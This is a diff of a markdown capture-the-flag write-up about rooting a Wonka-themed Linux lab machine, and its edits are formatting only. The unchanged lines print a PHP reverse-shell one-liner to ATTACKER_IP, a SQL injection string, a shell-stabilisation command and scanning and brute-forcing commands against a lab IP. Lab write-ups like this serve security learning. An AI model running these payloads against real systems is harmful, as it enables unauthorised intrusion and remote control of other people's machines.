@@ -4,7 +4,6 @@
 ## 🌟 Executive Summary
 Successfully penetrated a Wonka-themed Linux system through multiple vulnerabilities, ultimately gaining root access by combining web exploitation, steganography, and privilege escalation techniques.
 
-```bash
                      _.-~-.
                    _' {} _-~
                  _~ ._ ~-._
@@ -22,7 +21,6 @@ Successfully penetrated a Wonka-themed Linux system through multiple vulnerabili
 🔍 Reconnaissance
 🛠️ Tools Used
 
-bash
 
 🛡️ Nmap | 🕷️ Feroxbuster | 🔍 ffuf | 🖼️ Steghide | 🧰 LinPEAS
 
@@ -34,8 +32,6 @@ Port	Service	Version	Findings
 100	Custom	?	Mysterious Wonka message
 
 🔑 Key Discoveries
-diff
-
 
 + Found hidden shadow file in gum_room.jpg via steghide
 + SQL injection vulnerability using 'or 1=1 -- 
@@ -50,7 +46,6 @@ python
 php -r '$sock=fsockopen("ATTACKER_IP",7777);exec("sh <&3 >&3 2>&3");'
 
 🧩 Stabilizing Shell
-bash
 
 # Magic shell stabilization sequence
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -90,6 +85,7 @@ Cryptography	Found keys might be useful later
 # Nmap scan
 nmap -sV -sC -p- 10.10.109.203
 rustscan -a <ip> -- -A
+
 # Web directory brute-forcing
 feroxbuster -u http://10.10.109.203/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 
